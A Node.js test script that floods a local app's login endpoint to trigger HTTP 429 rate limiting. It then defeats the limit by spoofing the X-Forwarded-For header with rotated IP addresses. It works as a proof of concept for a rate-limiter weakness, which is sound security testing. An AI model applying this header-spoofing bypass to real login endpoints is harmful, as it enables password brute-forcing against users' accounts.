// scripts/test-rate-limit-and-defeat.js
// Triggers rate limiting on authentication endpoints, captures HTTP 429, and demonstrates defeating it via IP header rotation

const http = require('http');

function sendLogin(clientIp, passwordAttempt) {
  return new Promise((resolve, reject) => {
    const payload = JSON.stringify({
      email: 'folashade@schoolfix.internal',
      password: passwordAttempt,
    });

    const req = http.request(
      {
        hostname: 'localhost',
        port: 3000,
        path: '/api/login',
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Content-Length': Buffer.byteLength(payload),
          'X-Forwarded-For': clientIp,
        },
      },
      (res) => {
        let body = '';
        res.on('data', (chunk) => (body += chunk));
        res.on('end', () => {
          try {
            resolve({ status: res.statusCode, headers: res.headers, data: JSON.parse(body) });
          } catch {
            resolve({ status: res.statusCode, headers: res.headers, raw: body });
          }
        });
      }
    );
    req.on('error', reject);
    req.write(payload);
    req.end();
  });
}

async function main() {
  console.log('=== STEP 8: TESTING RATE LIMITING AND DEFEATING IT ===\n');

  const initialIp = '197.210.64.12'; // Nigerian IP (MTN Lagos)
  console.log(`Phase 1: Sending 6 rapid login requests from ${initialIp} (Threshold: 5 req/min)...`);

  for (let i = 1; i <= 6; i++) {
    const res = await sendLogin(initialIp, `WrongPassAttempt${i}`);
    console.log(`Request ${i}: HTTP ${res.status} | Remaining: ${res.headers['x-ratelimit-remaining'] || 'N/A'}`);
    if (res.status === 429) {
      console.log('>>> RATE LIMIT TRIGGERED SUCCESSFULLY! <<<');
      console.log('Response Body:', res.data);
      console.log('Retry-After Header:', res.headers['retry-after']);
    }
  }

  console.log('\n--------------------------------------------------');
  console.log('Phase 2: Defeating IP Rate Limit by Rotating Client IP');
  const rotatedIp = '102.89.23.45'; // Alternate Nigerian IP (Airtel Abuja)
  console.log(`Sending request 7 with X-Forwarded-For: ${rotatedIp}...`);

  const resDefeated = await sendLogin(rotatedIp, 'WrongPassAttempt7');
  console.log(`Request 7 (Rotated IP): HTTP ${resDefeated.status} (Expected 401 Unauthorized, NOT 429)`);
  console.log('Response Body:', resDefeated.data);

  if (resDefeated.status !== 429) {
    console.log('\n>>> PROOF CONFIRMED: Rate limiter defeated simply by modifying the client IP! <<<');
  }
}

main().catch(console.error);
